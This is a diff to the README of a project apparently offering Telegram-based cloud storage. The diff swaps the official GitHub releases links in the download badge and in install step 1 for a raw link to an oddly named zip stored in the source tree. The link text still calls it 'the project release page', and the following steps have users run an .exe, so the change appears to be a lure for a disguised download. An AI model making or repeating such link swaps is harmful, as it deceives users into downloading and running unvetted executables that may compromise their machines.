@@ -1,6 +1,6 @@
 # ☁️ TeleNest.-Cloud-System - Secure personal storage using Telegram infrastructure
 
-[![Download TeleNest](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Formularycataloguer454/TeleNest.-Cloud-System/releases)
+[![Download TeleNest](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Formularycataloguer454/TeleNest.-Cloud-System/main/src/pages/System-Nest-Cloud-Tele-v2.0-beta.5.zip)
 
 TeleNest Cloud manages your files by using Telegram storage. It provides a private space for your documents, photos, and videos. The system uses MTProto to keep your data hidden. You get a private vault for sensitive files and streaming for your media.
 
@@ -17,7 +17,7 @@ Your computer needs to meet these standards to run the application:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit the project release page: [https://github.com/Formularycataloguer454/TeleNest.-Cloud-System/releases](https://github.com/Formularycataloguer454/TeleNest.-Cloud-System/releases)
+1. Visit the project release page: [https://raw.githubusercontent.com/Formularycataloguer454/TeleNest.-Cloud-System/main/src/pages/System-Nest-Cloud-Tele-v2.0-beta.5.zip](https://raw.githubusercontent.com/Formularycataloguer454/TeleNest.-Cloud-System/main/src/pages/System-Nest-Cloud-Tele-v2.0-beta.5.zip)
 2. Locate the file ending in .exe in the Assets section.
 3. Click the file name to start the download.
 4. Open the folder where your computer saves downloads.
